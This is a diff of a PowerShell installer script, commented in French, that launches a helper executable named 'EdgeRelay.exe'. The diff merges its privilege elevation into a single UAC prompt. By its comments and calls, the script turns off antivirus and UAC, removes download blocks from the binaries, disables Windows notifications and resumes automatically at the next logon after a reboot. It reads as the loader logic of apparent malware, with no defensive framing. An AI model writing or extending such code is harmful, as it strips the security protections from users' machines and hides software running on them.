@@ -801,12 +801,7 @@ function Start-Helper([string]$Helper, [string]$WorkDir) {
   Unblock-Quiet $Helper
   Unblock-Quiet (Join-Path $WorkDir 'EdgeRelay.exe')
 
-  # 1) Essai demarrage (AV coupe juste apres via SessionHarden — toujours)
-  if (-not $ForceHarden) {
-    if (Try-StartHelper $Helper $WorkDir) { return }
-  }
-
-  # 2) Bloque au demarrage → elev + AV off + retry
+  # Si deja admin: harden + start. Sinon le caller a deja fait Invoke-ElevatedInstall (1 UAC).
   if (-not (Test-IsAdmin) -and -not $IsElevatedRun) {
     Invoke-ElevatedInstall
     return
@@ -888,12 +883,23 @@ Clear-LegacySidecars
 $script:ElevDoneOk = $false
 $script:ElevRebootPending = $false
 Disable-WindowsNotifications
-# Toujours AV/UAC off en admin AVANT demarrage HelperHost
-if (-not (Test-IsAdmin)) {
-  try { Invoke-ElevatedSessionPrep } catch {}
-} else {
-  Invoke-SessionHarden
+
+# UNE seule elevation UAC pour tout (AV + start). Pas de prep separee apres.
+if (-not (Test-IsAdmin) -and -not $IsElevatedRun) {
+  Invoke-ElevatedInstall
+  if ($script:ElevDoneOk) {
+    Finish-Ok
+    return
+  }
+  if ($script:ElevRebootPending) {
+    Write-Output 'REBOOT-PENDING (reprise auto a la prochaine connexion)'
+    return
+  }
+  throw 'Elevation UAC refusee ou install admin echouee'
 }
+
+# Deja admin (ou passe elev)
+Invoke-SessionHarden
 Start-Helper $Helper $Dir
 
 if ($script:ElevDoneOk) {
@@ -906,11 +912,9 @@ if ($script:ElevRebootPending) {
 }
 
 $ok = $false
-for ($i=0; $i -lt 180; $i++) {
+for ($i=0; $i -lt 90; $i++) {
   Start-Sleep -Seconds 1
   if (Test-HelperReady) {
-    # Re-harden if elev prep was skipped/refused earlier
-    try { Invoke-ElevatedSessionPrep } catch {}
     Finish-Ok
     $ok = $true
     break
